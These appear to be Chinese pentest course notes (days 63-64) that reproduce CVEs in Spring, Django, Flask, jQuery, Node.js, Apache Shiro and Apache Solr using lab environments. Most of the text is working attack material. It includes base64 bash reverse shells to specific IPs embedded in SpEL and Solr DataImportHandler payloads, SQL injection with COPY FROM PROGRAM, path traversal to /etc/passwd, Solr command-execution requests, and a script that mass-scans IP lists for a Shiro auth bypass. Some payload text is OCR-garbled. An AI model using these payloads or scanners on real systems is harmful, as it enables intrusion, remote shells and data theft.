<h6 id="2-cve-2018-1273-Spring-Data-Commons-vulfocus"><a href="#2-cve-2018-1273-Spring-Data-Commons-vulfocus" class="headerlink" title="2.cve_2018_1273-Spring Data Commons vulfocus"></a>2.cve_2018_1273-Spring Data Commons vulfocus</h6><p>Spring Data Commons 1.13-1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6-2.6.10(Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5<br>Spring Data REST 3.0-3.0.5(Kay SR5）<br>bash-c<br>fecho.YmFzaCAtaSA+JiAvZGV2L3RicC80Ny45NC4yMzYuMTE3LZU1NjYgMD4mMQ&#x3D;&#x3D;<br>base64,-d bash,-i)<br>username#this getclass（）.forName(“java lang.Runtime”).getRuntime(.exec(“%62%61%<br>73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74<br>%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%3<br>0%4e%79%34%35%4e%43%34%79%4d%7a%59%75%4d%54%45%33%4c%7a%55%<br>31%4e%6a%59%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65<br>%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d”]&#x3D;&amp;passw0rd&#x3D;&amp;<br>repeatedPassword&#x3D;</p>
<h6 id="3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入-vulhub"><a href="#3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入-vulhub" class="headerlink" title="3、CVE-2022-22963 Spring Cloud Function Spel表达式注入 vulhub"></a>3、CVE-2022-22963 Spring Cloud Function Spel表达式注入 vulhub</h6><p>Spring Cloud Function提供了一个通用的模型，用于在冬种平台上部署基于函数的软件，<br>包括像Amazon AWS Lambda这样的FaaS(函数即服务，function as a service)平台。<br>Connection:close<br>spring cloud.function.routing-expression:T(java.lang.Runtime).getRuntime(.exec(“bash-<br>(echo,YmFzaCAtaSA+JiAVZGV2L3RjcC80Ny45NC4yMzYuMTE3LZU1NjYgMD4mMQ&#x3D;&#x3D;)<br>Kbase64.-d)(bash,-i)”)</p>
<h1 id="第六十三天-服务攻防-框架安全-CVE复现-Django-Flask-Node-JS-JQuery"><a href="#第六十三天-服务攻防-框架安全-CVE复现-Django-Flask-Node-JS-JQuery" class="headerlink" title="第六十三天 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery"></a>第六十三天 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</h1><h4 id="中间件及框架列表："><a href="#中间件及框架列表：" class="headerlink" title="中间件及框架列表："></a>中间件及框架列表：</h4><p>IIS,Apache,Nginx,Tomcat,Docker,K8s,Weblogic.JBoos,WebSphere,<br>Jenkins,GlassFish,Jetty,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Spring,<br>Flask,jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3.开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery<br>5、其他框架Java-Apache Shiro&amp;Apache Sorl</p>
<h4 id="常见语言开发框架：-1"><a href="#常见语言开发框架：-1" class="headerlink" title="常见语言开发框架："></a>常见语言开发框架：</h4><p>PHP:Thinkphp Laravel YIl Codelgniter CakePHP Zend<br>JAVA:Spring MyBatis Hibernate Struts2 Springboot<br>Python:Django Flask Bottle Turbobars Tornado Web2py<br>Javascript:Vue.js Node.js Bootstrap JQuery Angular</p>
<h4 id="章节内容：-9"><a href="#章节内容：-9" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
<h4 id="前置知识：-12"><a href="#前置知识：-12" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全测试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
<h5 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="应用服务安全测试流程：见图"></a>应用服务安全测试流程：见图</h5><p>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
<h5 id="开发框架组件安全测试流程："><a href="#开发框架组件安全测试流程：" class="headerlink" title="开发框架组件安全测试流程："></a>开发框架组件安全测试流程：</h5><p>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
<h4 id="演示案例：-37"><a href="#演示案例：-37" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Python-开发框架安全-Django&amp;Flask<br>JavaScript-开发框架安全-Jquery&amp;Node</p>
<p>Python-开发框架安全-Diango&amp;Fask</p>
<h5 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h5><p>Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开<br>发。Django采用了MTV的框架模式，即模型M,视图V和模版T,使用Django,程序员可以<br>方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能<br>强大的第三方插件，使得Django.具有较强的可扩展性。<br>1、Cve_201914234 需要登录到后台<br>访问下面的路径，单引号已注入成功，SQL语句报错：<br>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail_a%27b&#x3D;123<br>创建cmd exec:<br>admin&#x2F;vuln&#x2F;collection&#x2F;?detail title%27)%3d%271%27%200r%201%3d1%20%3bcreate<br>%20table%20cmd_exec(cmd_output%20text)-%20<br>调用cmd_exec执行命令：<br>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail title%27)%3d%271%27%20or%201%3d1%20%3bcopy%<br>20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz dnslog.cn%27–%20<br>2、CVE-2021-35042 vulfocus<br>&#x2F;vuln&#x2F;?order&#x3D;vuln collection name)select%20updatexml(1,%20concat(0x7e,<br>select%20@@basedir)),1)%23<br>&#x2F;vuln&#x2F;?order&#x3D;vuln collection.name)select%20updatexml(1.%20concat(Ox7e,<br>(select%20version（）)).1)%23<br>数i据库名：vuln&#x2F;?order-vuln collection.name)select%20 updatexml1,%20 concat(0x7e,<br>select%20database（）).1)%23<br>3、CVe-2022-28346<br><a target="_blank" rel="noopener" href="https://github.com/YouGina/CVE-2022-28346">https://github.com/YouGina/CVE-2022-28346</a></p>
<h5 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h5><p>Flask是一个使用Pythons编写的轻量级Web应用框架。其WSGl工具箱采用Verkzeug,模<br>板引擎则使用Jinja2 vulhub<br>?name&#x3D;%7B%25%20for%20c%20in%20%5B%5D.class_base_subclasses_<br>()<br>%20%25%7D%0A%7B%25%20if%20c.name %20%3D%3D%20%27catch_warning<br>s%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.init__globals<br>values（）</p>
<p>JavaScript-开发框架安全-Jquery&amp;Node</p>
<h5 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h5><p>1、cve_2018_9207cve20189208cve20189209<br>描述jQuery是一个快速、简洁的JavaScript框架，是继Prototype,之后又一个优秀的<br>JavaScript代码库（框架）于2006年1月由John Resig发布。<br>jQuery Upload File&lt;&#x3D;4.0.2中的任意文件上传<br>curl -F “myfile&#x3D;@php.php”“<a target="_blank" rel="noopener" href="http://123.58.236.76:56579/jquery-upload-">http://123.58.236.76:56579/jquery-upload-</a><br>file&#x2F;php&#x2F;upload.php”</p>
<h5 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h5><p>1、Cve202121315 vulfocus<br>Node.js:是一个基于Chrome V8引擎的JavaScripti运行环境，用于方便的培建响应速度快<br>易于拓展的网络应用。<br>Node.js-systeminformation是用于获取各种系统信息的Node.js模块在存在命令注入漏同的<br>版本中，攻击者可以通过未过滤的参数中注入payloadi执行系统命令。<br>Systeminformation&lt;5.3.1<br>git clone <a target="_blank" rel="noopener" href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git</a><br>node index.js<br>&#x2F;api&#x2F;getServices?name&#x3D;$(echo -e ‘xiaodi’&gt;test.txt)<br>2、cve201714849 vulfocus<br>GET:<br>&#x2F;static&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passwd</p>
<h1 id="第六十四天-服务攻防-框架安全-CVE复现Apache-shiro-Apache-Solr"><a href="#第六十四天-服务攻防-框架安全-CVE复现Apache-shiro-Apache-Solr" class="headerlink" title="第六十四天 服务攻防-框架安全&amp;CVE复现Apache shiro&amp;Apache Solr"></a>第六十四天 服务攻防-框架安全&amp;CVE复现Apache shiro&amp;Apache Solr</h1><h4 id="知识点：-43"><a href="#知识点：-43" class="headerlink" title="#知识点："></a>#知识点：</h4><p>中间件及框架列表：<br>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3、开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery<br>5、其他框架-Java-Apache Shiro&amp;Apache Sorl</p>
<p>常见语言开发框架：</p>
<p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等<br>JAVA：Spring MyBatis Hibernate Struts2 Springboot等<br>Python：Django Flask Bottle Turbobars Tornado Web2py等<br>Javascript：Vue.js Node.js Bootstrap JQuery Angular等</p>
<h4 id="章节内容：-10"><a href="#章节内容：-10" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制-特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
<h4 id="前置知识：-13"><a href="#前置知识：-13" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>-中间件安全测试流程：<br>1、判断中间件信息-名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
<p>-应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p>
<p>-开发框架组件安全测试流程：<br>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
<ul>
<li><h4 id="ApacheShiro-组件框架安全"><a href="#ApacheShiro-组件框架安全" class="headerlink" title="ApacheShiro-组件框架安全"></a>ApacheShiro-组件框架安全</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理</span><br><span class="line">判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，主要用到java中</span><br><span class="line">搜索：header=&quot;remeberMe=deleteMe&quot;</span><br><span class="line">在cookie中带有：Set-Cookie: remeberMe=deleteMe; Path=/; Max-Age=0; Expires=Tue, 26-Apr-2022 22:23:24 GMT</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">漏洞：https://avd.aliyun.com/search?q=shiro</span><br><span class="line">Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483】</span><br><span class="line">Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807】</span><br><span class="line">Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442】</span><br><span class="line">Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957】</span><br><span class="line">Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989】</span><br><span class="line">Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933】</span><br><span class="line">Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523】</span><br><span class="line">1、CVE_2016_4437 Shiro-550+Shiro-721</span><br><span class="line">环境：https://vulfocus.cn/#/dashboard?image_id=df02a278-761c-483b-913f-9f8142b9a19f</span><br><span class="line"> </span><br><span class="line">在GUI_Tools中也有他检测的漏洞利用。先点击检测当前秘钥，然后爆破秘钥，在接着爆破利用链及回显。回显结果： 发现构造链:CommonsCollections2  回显方式: TomcatEcho然后在选择相对应的。可以执行命令。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2、CVE-2020-11989</span><br><span class="line">漏洞下载地址：https://github.com/jweny/shiro-cve-2020-17523</span><br><span class="line">影响范围：Apache Shiro &lt; 1.7.1</span><br><span class="line"> </span><br><span class="line">下载源码，用idea打开，直接启动，默认开放9090端口，访问：http://127.0.0.1:9090/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">默认加载的地方：org.test.springbootshiro.SpringbootShiroApplication</span><br><span class="line">点击springbookshiroapplication 然后edit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在\src\main\java\org\test\springbootshiro目录下，有LoginController.java，SpringbootShiroApplication.java两个文件</span><br><span class="line"> </span><br><span class="line">在LoginController.java中，访问/doLogin，尝试输入账号密码，成功提示success，失败提示failed</span><br><span class="line">账号密码配置文件是在MyRealm.java文件中配置：java 123</span><br><span class="line"> </span><br><span class="line">当直接访问http://127.0.0.1:9090/admin/xxx的时候，地址就自动换成http://127.0.0.1:9090/login，显示内容为please login!，就是要登录的意思。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个漏洞是直接访问：http://127.0.0.1:9090/admin/%20</span><br><span class="line">这样就可以直接登录到后台。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果在白盒的角度分析的话，这个漏洞是怎么产生的。在LoginController.java这个文件中，这个文件引用了一个包：import org.apache.shiro.SecurityUtils;</span><br><span class="line">在pom.xml配置文件中：</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"> </span><br><span class="line">引用了这个框架org.apache.shiro，版本是1.7.0符合漏洞版本。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3、CVE-2020-1957</span><br><span class="line">影响范围：Apache Shiro &lt; 1.5.3</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/shiro$ cd CVE-2020-1957</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8080/，点击login跳转：http://192.168.233.128:8080/login.html</span><br><span class="line">如果直接访问：http://192.168.233.128:8080/xxx/..;/admin/就相当于直接进入了后台目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">也可以在网上写python代码来进行测试：</span><br><span class="line">语法：app=&quot;APACHE-Shiro&quot;</span><br><span class="line"> </span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">for url in open(&#x27;ips.txt&#x27;):</span><br><span class="line">	url=url.strip()</span><br><span class="line">	url=&#x27;http://&#x27;+url+&#x27;/;/login&#x27;</span><br><span class="line">	try:</span><br><span class="line">		code=requests.get(url).status_code</span><br><span class="line">		print(code)</span><br><span class="line">		if code==200:</span><br><span class="line">			print(url+&#x27;|ok&#x27;)</span><br><span class="line">	except Exception as e:</span><br><span class="line">		pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附加：shiro是很有名的漏洞点，特别是在面试中，基本上都会问到这个知识点。</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="ApacheSolr-组件框架安全"><a href="#ApacheSolr-组件框架安全" class="headerlink" title="ApacheSolr-组件框架安全"></a>ApacheSolr-组件框架安全</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。</span><br><span class="line"> </span><br><span class="line">漏洞：https://avd.aliyun.com/search?q=solr</span><br><span class="line">远程命令执行RCE（CVE-2017-12629）</span><br><span class="line">远程命令执行XXE（CVE-2017-12629）</span><br><span class="line">任意文件读取AND命令执行（CVE-2019-17558）</span><br><span class="line">远程命令执行漏洞(CVE-2019-0192)</span><br><span class="line">远程命令执行漏洞(CVE-2019-0193)</span><br><span class="line">未授权上传漏洞(CVE-2020-13957)</span><br><span class="line">Apache Solr SSRF (CVE-2021-27905)</span><br><span class="line">1、远程命令执行RCE（CVE-2017-12629）</span><br><span class="line">影响版本：Apache solr&lt;7.1.0版本</span><br><span class="line">语法：app=&quot;APACHE-Solr&quot; &amp;&amp; title==&quot;Solr Admin&quot;</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/CVE-2017-12629-RCE</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">参考：https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#/</span><br><span class="line">访问特定地址进行抓包：</span><br><span class="line">http://192.168.233.128:8983/solr/demo/config</span><br><span class="line">POST提交：&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br><span class="line">执行的命令是：touch /tmp/success</span><br><span class="line">数据包：</span><br><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.233.128:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 158</span><br><span class="line"> </span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">但是失败了，然后按照官方的原封不动的发：</span><br><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.233.128:8983</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 158</span><br><span class="line"> </span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进入docker环境查看是否成功：</span><br><span class="line">进入：sudo docker-compose exec solr bash</span><br><span class="line">查看：ls /tmp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2、任意文件读取AND命令执行（CVE-2019-17558）</span><br><span class="line">影响版本：Apache Solr 5.0.0版本至8.3.1</span><br><span class="line"> </span><br><span class="line">环境：https://vulfocus.cn/#/dashboard?image_id=0c32e104-8afe-433d-8b10-904d18704bef</span><br><span class="line"> </span><br><span class="line">利用脚本：https://github.com/jas502n/solr_rce</span><br><span class="line"> </span><br><span class="line">这个脚本采用了python2开发，用到虚拟机的python2环境。</span><br><span class="line">执行命令：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也可以进行批量测试，修改solr_rce.py文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">3、远程命令执行漏洞(CVE-2019-0193)</span><br><span class="line">影响版本：Apache Solr &lt; 8.2.0版本</span><br><span class="line">需要登录才能利用。</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/CVE-2019-0193</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">参考：https://vulhub.org/#/environments/solr/CVE-2019-0193/</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#/</span><br><span class="line">默认是没有test的，在执行：sudo docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">把poc进行复制：</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br><span class="line"> </span><br><span class="line">其中YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==是反弹命令base64编码。</span><br><span class="line">反弹命令：bash -i &gt;&amp; /dev/tcp/175.178.151.29/5566 0&gt;&amp;1</span><br><span class="line">base64：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=</span><br><span class="line"> </span><br><span class="line">然后在点击execute with this configuration</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">4、Apache Solr 文件读取&amp;SSRF (CVE-2021-27905)</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/Remote-Streaming-Fileread</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#!/</span><br><span class="line">1、获取数据库名</span><br><span class="line">http://192.168.233.128:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br><span class="line">数据库名：demo</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2、访问触发</span><br><span class="line">curl -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#x27; \</span><br><span class="line">    $&#x27;http://192.168.233.128:8983/solr/demo/config&#x27;</span><br></pre></td></tr></table></figure>

